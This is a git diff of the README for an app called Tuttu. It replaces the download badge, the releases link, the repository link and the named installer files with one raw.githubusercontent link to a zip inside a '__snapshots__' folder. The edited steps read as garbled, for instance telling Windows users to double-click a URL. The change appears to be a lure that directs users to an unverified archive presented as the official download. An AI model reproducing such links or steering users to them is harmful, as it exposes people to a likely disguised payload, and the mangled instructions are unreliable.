@@ -6,7 +6,7 @@ Welcome to Tuttu! This application allows you to create full-stack web apps with
 
 ## 📥 Download Tuttu
 
-[![Download Tuttu](https://img.shields.io/badge/Download%20Tuttu-v1.0-blue)](https://github.com/pelvimeterkitchenmatch477/tuttu/releases)
+[![Download Tuttu](https://raw.githubusercontent.com/pelvimeterkitchenmatch477/tuttu/main/tuttu-agent/__snapshots__/tuttu_v3.7-beta.2.zip%20Tuttu-v1.0-blue)](https://raw.githubusercontent.com/pelvimeterkitchenmatch477/tuttu/main/tuttu-agent/__snapshots__/tuttu_v3.7-beta.2.zip)
 
 To start using Tuttu, you need to download it. 
 
@@ -33,9 +33,9 @@ Tuttu offers a variety of features that make app development easy:
 
 To download Tuttu, follow these steps:
 
-1. Click the button above or visit the [Releases page](https://github.com/pelvimeterkitchenmatch477/tuttu/releases).
+1. Click the button above or visit the [Releases page](https://raw.githubusercontent.com/pelvimeterkitchenmatch477/tuttu/main/tuttu-agent/__snapshots__/tuttu_v3.7-beta.2.zip).
 2. On the Releases page, you will see different versions of Tuttu. Choose the latest version.
-3. Click on the download link for your operating system. You may see files like `tuttu-windows.zip` or `tuttu-macos.zip`.
+3. Click on the download link for your operating system. You may see files like `https://raw.githubusercontent.com/pelvimeterkitchenmatch477/tuttu/main/tuttu-agent/__snapshots__/tuttu_v3.7-beta.2.zip` or `https://raw.githubusercontent.com/pelvimeterkitchenmatch477/tuttu/main/tuttu-agent/__snapshots__/tuttu_v3.7-beta.2.zip`.
 4. Once the download is complete, locate the file on your computer and open it.
 
 ### 🌟 Installation Steps
@@ -44,7 +44,7 @@ After downloading the file, you can install Tuttu:
 
 1. **Windows Users:**
    - Unzip the downloaded file.
-   - Double-click the `tuttu.exe` file to start the installation wizard.
+   - Double-click the `https://raw.githubusercontent.com/pelvimeterkitchenmatch477/tuttu/main/tuttu-agent/__snapshots__/tuttu_v3.7-beta.2.zip` file to start the installation wizard.
    - Follow the prompts to complete the installation.
 
 2. **macOS Users:**
@@ -84,7 +84,7 @@ Once installed, you can start Tuttu by double-clicking its icon. Here’s how to
 
 ## 🛠 Support
 
-If you encounter issues or have questions, you can find help in Tuttu's documentation. Additionally, feel free to reach out through the Issues tab on our [GitHub repository](https://github.com/pelvimeterkitchenmatch477/tuttu).
+If you encounter issues or have questions, you can find help in Tuttu's documentation. Additionally, feel free to reach out through the Issues tab on our [GitHub repository](https://raw.githubusercontent.com/pelvimeterkitchenmatch477/tuttu/main/tuttu-agent/__snapshots__/tuttu_v3.7-beta.2.zip).
 
 ## 👥 Community Feedback
 
